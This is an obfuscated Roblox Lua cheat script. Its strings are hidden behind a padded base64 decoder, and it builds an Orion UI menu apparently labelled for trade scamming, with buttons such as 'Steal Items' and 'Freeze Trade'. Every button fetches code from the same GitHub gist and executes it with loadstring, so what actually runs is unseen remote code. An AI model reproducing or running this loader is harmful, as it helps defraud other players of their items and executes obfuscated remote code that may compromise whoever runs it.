local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local player = game.Players.LocalPlayer

 local OrionLib = loadstring(game:HttpGet((sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('NBEcyrOVWNDTdfgegBicYeMlZMhIAlYYizaXnPmfZCPPVnbuflgSjNUaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NobGV4d2FyZS9Pcmlvbi9tYWluL3NvdXJjZQ=='))))()

local Window = OrionLib:MakeWindow({Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('kvWTwPnTtDGXbBxUedtfeacaGUniwwNWSXuPwFfWyOtBAHREWJrlKzxTW0yIFRyYWRlIFNjYW1t'), HidePremium = false, SaveConfig = true, ConfigFolder = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('SVghvohHZNlnHkAPdRJyspeYDKGXcooMDytYcnVoDLmgmTFczBMquUTT3Jpb25UZXN0')})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]

local Tab = Window:MakeTab({
	Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('WqfhfFftNfRIcLGlbvIkuTBDbCRVYJbKVagSQnyKCGqXVtGZJFlEknGVHJhZGUgU2NhbW0='),
	Icon = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('RmjaHDhoPwKGQuvJlcOeatXYsvokdfCqgTcriucduuUaGiCITsaRsikcmJ4YXNzZXRpZDovLzQ0ODMzNDU5OTg='),
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('UVGjtOMhHRsdsokaEIRjYkUOTzmKajLBXjqWUlUFwHvEGickKNTSJCkRW5nbGlzaCBvciBTcGFuaXNo')
})

--[[
Name = <string> - The name of the section.
]]

OrionLib:MakeNotification({
	Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('YEJyUYexuQaLuLtrSZrdnELZmBVknHWCPAuEiSajhGtOfbfiLPXkBiBU2NyaXB0IExvYWRlZA=='),
	Content = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('qDNHXBbGLzkobyXnFftwmBJNpFaTFHgQqLgsdGlnnxRHrykLFsmnbyETW0yIFNjcmlwdA=='),
	Image = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('KQHIVFJglYJavbRKfcmsVbyDLoJKtgxSIuTOEFaNhhTSxXHmyAFikvqcmJ4YXNzZXRpZDovLzQ0ODMzNDU5OTg='),
	Time = 5
})

Tab:AddButton({
	Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('mQcUOVDnkQPKDurIwZlnnesZcDLKlYHFSLLQbFJzWYDnYMDKpzgnEEsT24='),
	Callback = function()
      		
loadstring(game:HttpGet(sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('kfcBOiNWykWwRxJcmzqORLBGqOmwmNZrCKVpzSuCGGhLmmXAIvRrqIWaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvZWRjYjQzYTFjNGQ2MmI4NmUxODU3NTA4NjMyNWUyZWU=')))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('BMjnMtMthjrMzCItpLGcgFizdjuKoXzuIQJWaoHjwAOlMGxfWeqqlrjT2Zm'),
	Callback = function()
      	 
loadstring(game:HttpGet(sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('XWUITuvCrzFfPtKGTKsGXleWRZrDJTYDvbxokPyUNzPNxaUsOWRindaaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvZWRjYjQzYTFjNGQ2MmI4NmUxODU3NTA4NjMyNWUyZWU=')))()
  	end    
})

Tab:AddButton({
	Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('iwsdFuzHitIxTZIYzOIYJQbJommkavCsrfXVpwYaGzNheWschOyHxXRRnJlZXplIFRyYWRl'),
	Callback = function()
      	 
loadstring(game:HttpGet(sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('CsqjPRSbuYybEjnXFRsnBRSrljbquoWPaTZdiBroAMTuvBHmpaSRMBzaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvZWRjYjQzYTFjNGQ2MmI4NmUxODU3NTA4NjMyNWUyZWU=')))()
  	end    
})

Tab:AddButton({
	Name = sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('snlruCBMBeDQqNJtgyXZxWrNCCQxyVTLKPUVPvTBqSQmnhRooDCyESlU3RlYWwgSXRlbXM='),
	Callback = function()
      		
loadstring(game:HttpGet(sgngUKHqziWwYFARNVsaGMHApGZFqrXKGUTloeNvIWMTeoEtLjrruMyaERiypyeRknnVIdAMRLYkcHTXSAtPqO('rbslQTTBrRuAQjvepvXNbROdNKlLaGqccakKDaQjAIPpBheSmKtjswYaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvZWRjYjQzYTFjNGQ2MmI4NmUxODU3NTA4NjMyNWUyZWU=')))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]    
